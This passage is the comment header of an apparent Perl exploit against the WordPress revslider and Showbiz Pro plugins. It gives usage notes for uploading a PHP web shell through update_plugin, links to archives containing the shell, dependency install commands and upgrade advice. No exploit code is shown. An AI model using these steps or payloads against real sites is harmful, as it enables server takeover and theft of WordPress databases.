# 2- Uploading an web shell:
# The following perl exploit will try to upload an HTTP php shell through the the update_plugin function
# To use the exploit make sure you download first the revslider.zip and showbiz.zip files which contain cmd.php
# http://www.morxploit.com/morxploits/revslider.zip
# http://www.morxploit.com/morxploits/showbiz.zip
# and save them it in the same directory where you have the exploit.

#
# Requires LWP::UserAgent
# apt-get install libwww-perl
# yum install libwww-perl
# perl -MCPAN -e 'install Bundle::LWP'
# For SSL support:
# apt-get install liblwp-protocol-https-perl
# yum install perl-Crypt-SSLeay
#
# Mitigation:
# Besides the recently LFI vulnerability that was published couple months ago, this is another vulnerability that revslider developers have
# decided to patch without releasing a full security advisory, leaving thousands of revslider users who didn't update their plugin to the
# latest version (=> 3.0.96) vulnerable to this nasty flaw, revsliders developers will argue the fact that their slider comes with an
# auto-update feature, but the problem is that this plugin is bundled with a lot of themes, which means that those themes users may not get
# plugin updates or will have to pay to get the update. In other words revslider developers believe that every user should have the
# auto-update feature on, otherwise ... you are screwed.
# Obviously this is way more critical than the LFI vulnerability because it allows shell access giving attackers access to the target system
# as well as the ability to dump the entire wordpress database locally.
# That being said, upgrade immediately to the latest version or disable/switch to another plugin.
# As for Showbiz Pro, sadly the vulnerability has never been patched as we successfully exploited it in the latest version (1.7.1).
